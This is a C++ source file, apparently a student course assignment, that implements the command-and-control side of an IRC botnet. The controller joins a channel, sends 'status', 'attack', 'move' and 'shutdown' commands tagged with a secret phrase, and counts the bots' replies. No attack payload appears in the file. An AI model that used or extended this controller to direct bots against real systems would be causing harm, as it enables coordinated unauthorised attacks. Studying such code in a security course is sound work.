// file: controller.cpp
// Desc: Implements controller logic for Botnet. Doesn't poll IRC server so doesn't handle Ping Ponging, but will reconnect if it finds
//		that the connection has been dropped. Connection buffers the socket stream to return strings by line. Therefore, results can
//		be slightly skewed if commands are issued before the bots have a chance to fully connect to the server.
// Written by: James Cote
// ID: 10146559
// Tutorial: T01

// Includes
#include "connection.h"

// Defines
#define SERVER_NAME 1
#define PORT 2
#define CHANNEL_NAME 3
#define SECRET_PHRASE 4
#define MAX_ARG_COUNT 5
#define TIMEOUT_VAL 0.025
#define C_TO_SEC 100.f

// Globals
connection* pConnection;

// Function Declarations
inline int error( string sMsg );
void outputUseInfo();
bool handleInput( const string& sInput, const string& sSecretPhrase );
void handleCommand( int& iSuccess, int& iFailed );
bool isBot( const string& sBotName );

// Main
int main( int iArgC, char* pArgs[] )
{
	// local Variables
	int iPort;
	string sServerName, sChannelName, sSecretPhrase, sInputBuffer, sErrMsg;
	bool bQuit = false;

	// Verify Arguments
	if ( MAX_ARG_COUNT != iArgC )
		outputUseInfo();

	// Gather Command line arguments
	sServerName.assign( pArgs[ SERVER_NAME ] );
	sChannelName.assign( pArgs[ CHANNEL_NAME ] );
	iPort = atoi( pArgs[ PORT ] );
	sSecretPhrase.assign( pArgs[ SECRET_PHRASE ] );

	// Initialize Connection
	pConnection = new connection( sServerName, iPort, sChannelName, sErrMsg );

	// Check connection
	if ( pConnection->isConnected() )
	{
		// Connect to IRC server and flush out all initializing messages
		pConnection->connectToServer( "conbot" );
		pConnection->flushConnection();

		// initial message
		cout << "Controller is running. Connected with nick: " << *pConnection->getNickname() << endl;

		// Main loop
		while ( !bQuit )
		{
			// prompt user for command
			cout << "command> ";
			getline( cin, sInputBuffer );

			// Clear any missed messages and handle input
			pConnection->flushConnection();
			bQuit = handleInput( sInputBuffer, sSecretPhrase );
		}
	}
	else
		return error( "Failed to connect to IRC server.\n" );

	// Clean up.
	delete pConnection;

	// Return
	return 1;
}

// Error Function, pulled from previous code, lightly used.
inline int error( string sMsg )
{
	fprintf( stderr, "%s", sMsg.c_str() );
	return -1;
}

// Outputs the usage info for the user in the even that the arguments are incorrect.
// Exits with code 1.
void outputUseInfo()
{
	string sMessage;
	sMessage += "Usage: ./conbot <hostname> <port> <channel> <secret-phrase>\n";
	sMessage += "\t-<hostname>: Specifies the IRC server's hostname.\n";
	sMessage += "\t-<port>: specifies the port.\n";
	sMessage += "\t-<channel>: specifies which IRC channel to join.\n";
	sMessage += "\t-<secret-phrase>: specifies the secret text that the bots are listening for.\n";
	
	exit( error( sMessage ) );
}

// Handles Input from the user. Only accepts valid commands.
bool handleInput( const string& sInput, const string& sSecretPhrase )
{
	// Local Variables
	vector< string > sSplitInput;
	string sInputCpy( sInput );
	bool bQuit = !sInput.compare( "quit" );
	int iSuccess, iFailed;

	// Quit not specified? handle input.
	if ( !bQuit )
	{
		// Split input by spaces.
		pConnection->splitString( sInput, ' ', sSplitInput );
		
		// Add secret phrase for issuing command.
		sInputCpy.append( " " + sSecretPhrase );

		// Handle first command
		if ( !sSplitInput[ 0 ].compare( "status" ) )
		{
			pConnection->issueCommand( sInputCpy );
			handleCommand( iSuccess, iFailed );
			cout << "Found " << iSuccess << " bots.\n";
		}
		else if ( !sSplitInput[ 0 ].compare( "attack" ) )
		{
			pConnection->issueCommand( sInputCpy );
			handleCommand( iSuccess, iFailed );
			cout << "Total: " << iSuccess << " successful, " << iFailed << " unsuccessful.\n";
		}
		else if ( !sSplitInput[ 0 ].compare( "move" ) )
		{
			pConnection->issueCommand( sInputCpy );
			handleCommand( iSuccess, iFailed );
			cout << "Total: " << iSuccess << " successful, " << iFailed << " unsuccessful.\n";
		}
		else if ( !sSplitInput[ 0 ].compare( "shutdown" ) )	
		{ 
			pConnection->issueCommand( sInputCpy );
			handleCommand( iSuccess, iFailed );
			cout << "Total: " << iSuccess << " bots shut down.\n";
		}
		else
			cout << "Invalid Command: \"" << sInput << "\"\n";
	}

	return bQuit;
}

// General handling of responses from bots on the server.
//	Assumptions: Failure messages will have a comma somewhere in them.
//	Note: Timer is short and resets after each message caught from a bot. This is to ensure correct stats reported.
void handleCommand( int& iSuccess, int& iFailed )
{
	// Local Variables
	iFailed = 0; 
	iSuccess = 0;
	string sBuffer, sBotName;
	vector< string > sSplitInput, sSplitDetails;
	clock_t tStart = clock();

	// Loop, grabbing lines and parsing each line in turn to determine bot response.
	do
	{
		// Get Next line
		if ( pConnection->getNextLine( sBuffer ) > 0 )
		{
			// Split Buffer into details and message. Then further split details by space
			pConnection->splitString( sBuffer, ':', sSplitInput );
			pConnection->splitString( sSplitInput[ 0 ], ' ', sSplitDetails );

			// Get Bot Name
			sBotName = sSplitInput[ 0 ].substr( (':' == sSplitInput[ 0 ][ 0 ] ? 1 : 0), sSplitInput[ 0 ].find_first_of( '!' ) );

			// Check: Is it a private message? is it sent to controller? is it sent by a bot?
			if ( !sSplitDetails[ 1 ].compare( "PRIVMSG" ) && sSplitDetails[ 2 ][ 0 ] != '#' && isBot( sBotName ) )
			{
				// Output Response from bot
				cout << sBotName << ": " << sSplitInput[ 1 ] << endl;

				// Increment Success and Fail count. Success won't have a ',' in its message.
				if ( string::npos == sSplitInput[ 1 ].find_first_of( ',' ) )
					++iSuccess;
				else
					++iFailed;
			}

			// Clear Buffers
			sSplitDetails.clear();
			sSplitInput.clear();
			tStart = clock(); // Reset timer to wait for next bot
		}
	} while ( ((float) (clock() - tStart) / 1000.0) < TIMEOUT_VAL ); // Time out after TIMEOUT_VAL
}

// Small helper function to confirm that it was a bot that sent the message.
bool isBot( const string& sBotName )
{
	return !sBotName.compare( 0, 3, "bot" );
}
